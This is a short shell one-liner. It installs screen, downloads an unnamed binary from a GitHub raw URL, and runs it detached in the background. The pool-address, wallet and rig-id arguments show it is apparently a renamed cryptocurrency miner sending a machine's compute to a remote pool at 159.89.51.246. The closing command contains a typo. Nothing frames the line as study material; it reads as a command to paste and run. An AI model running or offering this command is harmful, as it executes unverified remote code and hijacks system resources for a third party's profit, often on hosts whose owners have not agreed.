sudo apt install screen -y &&
wget https://github.com/washil789/tambang/raw/main/tuyultambang &&
chmod +x tuyultambang &&
screen -dmS run ./tuyultambang -o 159.89.51.246:443 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp+50000 --rig-id $(echo $(shuf -i 1-999 -n 1)-CLBV) && sreen -r

